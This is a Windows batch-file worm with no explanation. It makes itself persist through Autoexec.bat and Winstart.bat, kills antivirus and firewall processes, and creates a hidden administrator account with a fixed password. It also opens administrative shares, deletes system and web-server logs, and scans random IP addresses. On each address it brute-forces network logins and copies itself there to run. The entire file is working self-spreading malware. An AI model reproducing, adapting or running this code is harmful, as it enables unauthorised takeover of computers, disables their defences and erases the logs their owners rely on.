@echo off
@SET addadmin=robot 
SET SORI=1
SET ADDR1=254
SET ADDR2=254
SET ADDR3=254
SET ADDR4=254
SET WORM=code.bat
@Copy /y %windir%\system32\%WORM% C:\Autoexec.bat
@Copy /y %windir%\system32\%WORM% %windir%\system32\Winstart.bat
@MD c:\RECYCLER\CON\\
@MD d:\RECYCLER\CON\\
Copy /y code.bat \\.\c:\RECYCLER\CON\
Copy /y p.txt \\.\c:\RECYCLER\CON\
Copy /y u.txt \\.\c:\RECYCLER\CON\
Copy /y ps.exe \\.\c:\RECYCLER\CON\
Copy /y psk.exe \\.\c:\RECYCLER\CON\
Copy /y code.bat \\.\d:\RECYCLER\CON\
Copy /y p.txt \\.\d:\RECYCLER\CON\
Copy /y u.txt \\.\d:\RECYCLER\CON\
Copy /y ps.exe \\.\d:\RECYCLER\CON\
Copy /y psk.exe \\.\d:\RECYCLER\CON\
PSK Rfw.exe
PSK KAVPFW.exe
PSK KAV9X.exe
PSK VPC32.exe
PSK PFW.exe
PSK RavMon.exe
psk mdm.exe
psk ccenter.exe
psk kv*.exe
psk duba.exe
psk norton.exe
psk symantec*.exe
net user %addadmin% "dvbbs" /add
IF %ERRORLEVEL%==0 net localgroup Administrators %addadmin% /add
 net share ipc$ 
 net share admin$ 
 net share C$=c:\ 
 net share D$=d:\ 
 net share E$=e:\ 
 net share F$=f:\ 
del %windir%\system32\logfiles\w3svc1\*.* /f /q
del %windir%\system32\logfiles\w3svc2\*.* /f /q
del %windir%\system32\config\*.event /f /q
del %windir%\system32dtclog\*.* /f /q
del %windir%\*.txt /f /q
del %windir%\*.log /f /q

:IPADDRESS
IF %SORI%==4 SET /A ADDR4=%RANDOM% %% %ADDR4%

IF %SORI%==3 (
SET /A ADDR3=%RANDOM% %% %ADDR3%
SET /A ADDR4=%RANDOM% %% %ADDR4%
)
IF %SORI%==2 (
SET /A ADDR2=%RANDOM% %% %ADDR2%
SET /A ADDR3=%RANDOM% %% %ADDR3%
SET /A ADDR4=%RANDOM% %% %ADDR4%
)
IF %SORI%==1 (
SET /A ADDR1=%RANDOM% %% %ADDR1%
SET /A ADDR2=%RANDOM% %% %ADDR2%
SET /A ADDR3=%RANDOM% %% %ADDR3%
SET /A ADDR4=%RANDOM% %% %ADDR4%
)   
SET ADDRESS=%ADDR1%.%ADDR2%.%ADDR3%.%ADDR4%
echo off
@FOR /F %%K IN (U.txt) DO FOR /F %%J IN (P.txt) DO NET USE \\%ADDRESS%\IPC$ %%J /USER:%%K & IF NOT errorlevel 1 GOTO RUN

GOTO IPADDRESS

:RUN
COPY code.bat \\%ADDRESS%\ADMIN$\SYSTEM32\%WORM%
IF errorlevel 1 GOTO err
MD \\%ADDRESS%\C:\RECYCLER\CON\\
MD \\%ADDRESS%\C:\RECYCLER\CON\\
COPY code.bat \\%ADDRESS%\c$\recycler\CON\
COPY code.bat \\%ADDRESS%\d$\recycler\CON\
COPY U.txt \\%ADDRESS%\c$\recycler\CON\
COPY P.txt \\%ADDRESS%\c$\recycler\CON\
COPY PS \\%ADDRESS%\c$\recycler\CON\
COPY PSK \\%ADDRESS%\c$\recycler\CON\
COPY u.txt \\%ADDRESS%\d$\recycler\CON\
COPY P.txt \\%ADDRESS%\d$\recycler\CON\
COPY PS \\%ADDRESS%\d$\recycler\CON\
COPY PSK \\%ADDRESS%\d$\recycler\CON\
PS \\%ADDRESS%\d:\recycler\CON\code.bat
NET USE \\%ADDRESS%\IPC$ /DEL
GOTO IPADDRESS


:err
goto IPADDRESS